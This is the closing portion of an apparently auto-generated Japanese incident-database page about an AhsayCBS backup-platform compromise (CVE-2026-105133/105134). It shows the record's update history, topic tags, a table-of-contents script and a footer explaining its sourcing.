+<div id="sec-updates"><div class="blk " id="s20"><h3>この記録の更新履歴</h3><ul class="sm"><li><span class=sm>2026年10月9日</span> <span class="b rev">新規作成</span> 2026年10月8日の Huntress の分析を起点に新規作成した。 **CVE の記載（INCIBE-CERT の CVE-2026-105134／CVE-2026-105133）を独自に取得し、 影響する版・CWE・CVSS・解決策を確認した結果、 Huntress の訂正（10.3.4 も影響を受ける・修正は無い）と CVE の記載（10.3.2 以前・10.3.4 で修正）の食い違いを見つけ、 最も運用に響く齟齬として記録した。** **あわせて供給元 Ahsay の security advisory のページを確認したが、 本件に関する告知は無く（掲載は2019年4月24日の1件のみ）、 供給元の公式の認定が存在しないことを齟齬として記録した。** **本記録は〈修正版が利用者の手元に無い状態で実地の悪用が起きていること〉と 〈侵害されたのがバックアップの管理基盤であること〉を中心として評価した。** Huntress が公開した Sigma ルール4本の設計の理由を引き、 製品名に依存しない3つの点検項目（管理基盤の露出／ 公開サービスの子プロセスの監視／脆弱な正規ドライバの遮断）に落とした。 **IoC のハッシュ値は保存分の本文で表の値が欠落していたため転記していない** （推測で補わないことを齟齬に明記した）。 日本の組織の利用・被害は確認できていないため japan_relevance を overseas-watch とし、その理由を note と齟齬に明示した</li></ul></div></div>
+<div class="blk " id="s21"><h3>タグ</h3><span class="b tag">AhsayCBS</span><span class="b tag">Ahsay</span><span class="b tag">CVE-2026-105133</span><span class="b tag">CVE-2026-105134</span><span class="b tag">認証回避</span><span class="b tag">未認証RCE</span><span class="b tag">ウェブシェル</span><span class="b tag">XMRig</span><span class="b tag">クリプトジャッキング</span><span class="b tag">NSSM</span><span class="b tag">WinRing0</span><span class="b tag">脆弱な正規ドライバ</span><span class="b tag">MSP</span><span class="b tag">バックアップ基盤</span><span class="b tag">Sigma</span><span class="b tag">Huntress</span><span class="b tag">修正版なし</span><span class="b tag">国内被害の記載なし</span></div>
+
+<script>
+// 狭い画面では目次を畳んでおく（本文が遠くなるのを避ける）。
+// 広い画面ではサイドバーとして常時表示するので開いたままにする。
+(function () {
+  var toc = document.getElementById('toc');
+  if (!toc) return;
+  var narrow = window.matchMedia('(max-width: 1179px)');
+  function sync(e) { if (e.matches) toc.removeAttribute('open'); else toc.setAttribute('open', ''); }
+  sync(narrow);
+  if (narrow.addEventListener) narrow.addEventListener('change', sync);
+  // 目次から飛んだら、狭い画面では畳んで本文を見せる
+  toc.addEventListener('click', function (ev) {
+    if (ev.target.tagName === 'A' && narrow.matches) toc.removeAttribute('open');
+  });
+})();
+</script>
+
+<footer>
+  インシデント事例DB — 自動生成｜作成 2026-10-09 18:09 JST<br>
+  <b>Part 1（起きたこと）</b>は公表資料・報道に基づく事実の記録です。数値には確度と出所を、
+  出典には一次情報／報道の別を付しています。公表されていない事項は削除せず明示しています。<br>
+  <b>Part 2（学べること）</b>は本記録による評価・示唆であり、当事者の見解ではありません。
+</footer>
+</div>
+</body>
+</html>
